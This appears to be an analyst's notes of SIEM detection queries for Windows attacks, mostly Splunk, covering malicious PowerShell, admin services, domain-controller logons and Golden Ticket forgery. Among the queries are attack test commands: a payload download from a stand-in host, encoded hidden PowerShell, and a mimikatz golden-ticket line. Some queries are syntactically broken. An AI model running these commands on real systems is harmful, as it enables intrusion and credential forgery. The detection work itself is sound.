suspect parent process of cmd and powershell - blacklist- process Events:

process contains "cmd.exe", "powershell.exe" && process.src contains "winword.exe", "excel.exe", "powerpnt.exe", "mspub.exe", "visio.exe", "outlook.exe", "java", "lsass.exe", "csrss.exe", "epad.exe", "regsvr32.exe", "dllhost.exe", "LogonUI.exe", "wermgr.exe", "spoolsv.exe", "jucheck.exe", "jusched.exe", "ctfmon.exe", "taskhostw.exe", "GoogleUpdate.exe", "sppsvc.exe", "sihost.exe", "slui.exe", "SIHClient.exe", "SearchIndexer.exe", "SearchProtocolHost.exe", "FlashPlayerUpdateService.exe", "WerFault.exe", "WUDFHost.exe", "unsecapp.exe", "wlanext.exe"


suspect parent process of powershell - whitelis - process Events:

process contains "powershell.exe" AND process.src != "c:\\windows\\explorer.exe" AND process.src exists AND process.src != "C:\\Windows\\System32\\svchost.exe" AND process.src != "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe" AND process.src != "C:\\Windows\\System32\\cmd.exe" AND process.src != "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"

Suspected Powershell Commands - blacklist - Powershell Events:


reference.id = "800" AND param contains " -NoP ", " -W Hidden ", " -e* JAB", " -e* SUVYI", " -e* SQBFAFgA", " -e* aWV4I", " -e* IAB", " -e* PAA", " -e* aQBlAHgA", ".downloadstring", ".downloadfile", ";iex"


A service running with admin privilege:
reference.id = '4688' && process.src contains 'c:\windows\system32\services.exe' && user.dst contains 'admin'

Connection to DC without passing by console:

device.class = 'Windows Hosts' && reference.id = '4624' && logon.type = '10' && ip.src != 10.51.116.38,39,3,10.61.119.20 && device.host contains 'dc'



schtasks /create /tn "LaunchCmdTest" /tr "cmd.exe" /sc once /st 00:00
schtasks /run /tn "LaunchCmdTest"



cmd.exe (Command Prompt) and powershell.exe (PowerShell) are legitimate system utilities but are often exploited by attackers to execute scripts or commands. These processes may have a malicious parent process (e.g., a suspicious executable or script) initiating them.


index=windows AND source="WinEventLog:Security" AND EventCode=4688 AND parent_process_name IN ( "winword.exe", "excel.exe", "powerpnt.exe", "mspub.exe", "visio.exe", "outlook.exe", "java", "lsass.exe", "csrss.exe", "epad.exe", "regsvr32.exe", "dllhost.exe", "LogonUI.exe", "wermgr.exe", "spoolsv.exe", "jucheck.exe", "jusched.exe", "ctfmon.exe", "taskhostw.exe", "GoogleUpdate.exe", "sppsvc.exe", "sihost.exe", "slui.exe", "SIHClient.exe", "SearchIndexer.exe", "SearchProtocolHost.exe", "FlashPlayerUpdateService.exe", "WerFault.exe", "WUDFHost.exe", "unsecapp.exe", "wlanext.exe", "wordpad.exe") AND new_process_name IN ("cmd.exe","powershell.exe")

| eval severity = "High" 
| rename dvc_nt_host AS dvc 
| table parent_process_name new_process_name user severity



PowerShell (powershell.exe) is a legitimate system administration tool, but it is often exploited by attackers for malicious purposes. A whitelist approach helps identify deviations from expected behavior by focusing on legitimate parent processes that should typically invoke PowerShell


index=windows AND source="WinEventLog:Security" AND EventCode=4688 AND new_process_name="powershell.exe" AND NOT parent_process_name  IN ("explorer.exe","svchost.exe","WmiPrvSE.exe","cmd.exe","powershell.exe","QualysAgent.exe")
| eval severity = "High" 
| rename dvc_nt_host AS dvc 
| table dvc user parent_process_name new_process_name severity


powershell.exe -WindowStyle Hidden -Command "Write-Output 'Simulating hidden window'"
powershell.exe -EncodedCommand SQBFAFgA
Invoke-WebRequest -Uri "http://malicious-example.com/payload" -OutFile "C:\Users\Public\malware.exe"

# Encoded command example
$encodedCommand = "JABFAFgAIAAtTm9QIC1XIEhpZGRlbiAtZQAgJABJAGUAeABQAA=="
powershell.exe -NoP -W Hidden -EncodedCommand $encodedCommand


The technique "Suspected PowerShell Commands - Blacklist - PowerShell Events" typically refers to detecting potentially malicious PowerShell activities by monitoring and blacklisting specific commands, scripts, or keywords in PowerShell logs. These events are identified through PowerShell



index=windows AND source="WinEventLog:Microsoft-Windows-PowerShell/Operational"  AND EventCode=4104 AND ( " -NoP "OR "*-W Hidden*" OR "*-e* JAB*" OR "*-e* SUVYI*" OR "*-e* SQBFAFgA*" OR "*-e* aWV4I*" OR "*-e* IAB*" OR "*-e* PAA*" OR "*-e* aQBlAHgA*" OR "*.downloadstring*" OR "*.downloadfile*" OR "*;iex*")
| eval severity = "High"
| rename dvc_nt_host AS dvc, UserID AS user


sc create AdminService binPath= "cmd.exe /k" start= demand obj= "DOMAIN\AdminUser" password= "AdminPassword"

This technique involves leveraging a service or process that is running with administrative privileges on a system


index=windows AND source="WinEventLog:Security" AND  EventCode=4688 AND  parent_process_name="services.exe" AND user="*admin*"
| eval severity = "Medium" 
| rename dvc_nt_host AS dvc 
| table dvc user parent_process_name severity


Connection to DC without passing by console
Detect and alert when a user establishes a connection to a Domain Controller (DC) without utilizing the console (e.g., via remote desktop or other non-console methods). This ensures compliance with security policies restricting non-console administrative access to sensitive systems.


index=windows AND source="XmlWinEventLog:Security" AND EventCode=4624 AND Logon_Type=10 AND host=*dc* AND NOT src_ip IN ("10.51.116.38","10.51.116.39","10.51.116.3")
| eval severity = "Medium" 
| rename dvc_nt_host AS dvc
| table dvc user src_ip dvc severity



Detect unauthorized changes to system time, which adversaries may use to evade detection or manipulate logs.

index=windows AND source="WinEventLog:Security" AND EventCode=4616 
| eval severity = "Low" 
| rename dvc_nt_host AS dvc 
| table dvc user severity


index=skyhigh | search destip="*"  AND  url !="http://ipv6.msftconnecttest.com/connecttest.txt" | 
regex destip="^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$|^(([0-9a-fA-F]{1,4}:){1,7}|:):$|^([0-9a-fA-F]{1,4}:){1,7}:$|::([0-9a-fA-F]{1,4}:){1,7}[0-9a-fA-F]{1,4}$"
| eval severity = "Medium" 
| table user srcip destip

IPv6 traffic in a network environment can be legitimate but may also indicate suspicious behavior or potential attacks when observed unexpectedly or without proper planning. Below is a brief explanation of compliance, attacks, behaviors, and associated MITRE ATT&CK techniques:

IPv6 traffic in the network

T1572


index=<your_index> sourcetype=<your_sourcetype>
| where NOT match(host.src, "DZ[0-9]{7}[L,D,T,P]$") AND NOT match(host.src, "^(sga|isga|xsga|hsga|-|\\\\sga).*")
| table _time host.src


index=windows AND EventCode=4624 AND user=*$
| where NOT match(user, "DZ[0-9]{7}[L,D,T,P]") AND NOT match(user, "^(sga|SGA|isga|xsga|hsga|SGAH|VX-ESXI|VSGA|-|\\\\sga).*")
| eval severity = "Low"
| rename user AS dvc
| table dvc severity

In many organizations, devices follow a standardized naming pattern to maintain operational consistency and facilitate monitoring. Machines with non-compliant names could signify unauthorized additions, potential security risks, or misconfigurations. This use case focuses on identifying and flagging such machines for further review

Machine Nomination Doesn't Respect Organizational Naming Pattern

T1078.002


index=windows AND source="WinEventLog:Security" AND EventCode=4672 | regex user="^z[1-9]{3}"
| eval severity = "Medium" 
| rename dvc_nt_host AS dvc 
| table dvc user severity



index=windows EventCode=4769 
| eval timestamp_4769 = _time 
| join type=left Account_Name, Client_Address [ 
    search index=windows EventCode=4768 earliest=-5m@m latest=@m 
    | eval timestamp_4768 = _time 
    | table Account_Name, Client_Address, timestamp_4768 
] 
| where isnull(timestamp_4768) 
| table Account_Name, Client_Address, ServiceName, TicketOptions, timestamp_4769


`wineventlog_security` EventCode=4769 ServiceName="*$" (TicketOptions=0x40810000 OR TicketOptions=0x40800000 OR TicketOptions=0x40810010) TicketEncryptionType=0x17 
| stats count min(_time) as firstTime max(_time) as lastTime by dest, service, service_id, TicketEncryptionType, TicketOptions 
| `security_content_ctime(lastTime)` 
| `security_content_ctime(firstTime)` 
| `kerberos_service_ticket_request_using_rc4_encryption_filter`

kerberos::golden /domain:cs.org /sid:S-1-5-21-1833177430-4054197050-709912635 /rc4:9fd6073cd1b3969263ea36f50e787938 /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt   


index=your_index_name
(EventCode=4768 OR EventCode=4769)
| eval key=User."|".Source_Workstation
| bin _time span=1h
| stats values(EventCode) as event_codes by key User Source_Workstation _time
| eval has_4768=if(mvfind(event_codes, "4768") != -1, 1, 0)
| eval has_4769=if(mvfind(event_codes, "4769") != -1, 1, 0)
| where has_4768=0 AND has_4769=1
| table _time User Source_Workstation event_codes


index=your_index_name EventCode=4769
| eval normalized_user=lower(split(User, "@")[0])  <!-- Normalize User -->
| eval search_window=_time - 3  <!-- Define a 3-second lookback window -->
| search NOT [ search index=your_index_name EventCode=4768 _where “User” field ]
| table User Source_Workstation Source_Workstation


index=windows sourcetype=XmlWinEventLog EventCode=5137 OR EventCode=5141 ObjectDN="*CN=Servers*" OR ObjectDN="*CN=Sites,CN=Configuration*"
| transaction ObjectDN dvc startswith=(EventCode=5137) endswith=(EventCode=5141)
| eval short_lived=case((duration<10),"TRUE") 
| search short_lived = TRUE 
| stats values(ObjectDN) values(signature) values(EventCode) by _time, Computer, SubjectUserName, dvc
| search *



index=windows  AND host="SGA-ASTM006" AND (EventCode=4769 OR EventCode=4768)
| transaction src startswith=(EventCode=4768) endswith=(EventCode=4769)
| eval short_lived=case((duration<10),"TRUE") 
| search short_lived = TRUE 
| stats values(user) by _time EventCode
| search *


index=windows AND host="SGA-ASTM006" AND (EventCode=4769 OR EventCode=4768)
| transaction src startswith=(EventCode=4768) endswith=(EventCode=4769)
| search NOT duration=*  // Select only 4769 events without a preceding 4768
| table _time src user EventCode



To detect a potential Golden Ticket attack using Splunk by correlating events 4769 and 4768 within a 5-second window based on the src field, you can use a subsearch in SPL. Here's how you can write the query:

spl
Copy code
index=your_index sourcetype=your_sourcetype EventCode=4769
[ search index=your_index sourcetype=your_sourcetype EventCode=4768 earliest=-5s latest=now
  | fields src
  | dedup src
  | format ]
| table _time EventCode src


index=windows EventCode=4769
| eval earliest=_time-5, latest=_time
| join src [
    search index=windows EventCode=4768
    | fields src _time
]
| where _time <= earliest+5
| table _time EventCode src


index=main earliest=1690451977 latest=1690452262
source="WinEventLog:Security" user!=*$ EventCode IN (4768,4769,4770)
| rex field=user "(?<username>[^@]+)"
| rex field=src_ip "(\:\:ffff\:)?(?<src_ip_4>[0-9\.]+)"
| transaction username, src_ip_4 maxspan=10h keepevicted=true startswith=
(EventCode=4768)
| where closed_txn=0
| search NOT user="*$@*"
| table _time, ComputerName, username, src_ip_4, service_name, category


Pass-the-Ticket (Golden Ticket) is a credential theft and lateral movement technique in which attackers use Kerberos ticket-granting tickets (TGTs) forged with domain administrator credentials. This allows them to authenticate as any user within a domain without needing the user’s password. The Golden Ticket exploit provides long-term access to the compromised domain, often bypassing traditional password policies.


index=windows AND user!=*$ AND EventCode IN (4768,4769) AND (host=SGA-ASTM006 OR host=DCPM*) AND category="Kerberos Service Ticket Operations"
| eval severity = "High" 
| rex field=user "(?<username>[^@]+)"
| rex field=src_ip "(\:\:ffff\:)?(?<src_ip_4>[0-9\.]+)"
| transaction username, src_ip_4 maxspan=1h keepevicted=true startswith=
(EventCode=4768)
| where closed_txn=0
| search NOT user="*$@*"
| rename dvc_nt_host AS dvc, username As user
| table _time, dvc, user, src_ip_4, service_name, category EventCode  severity
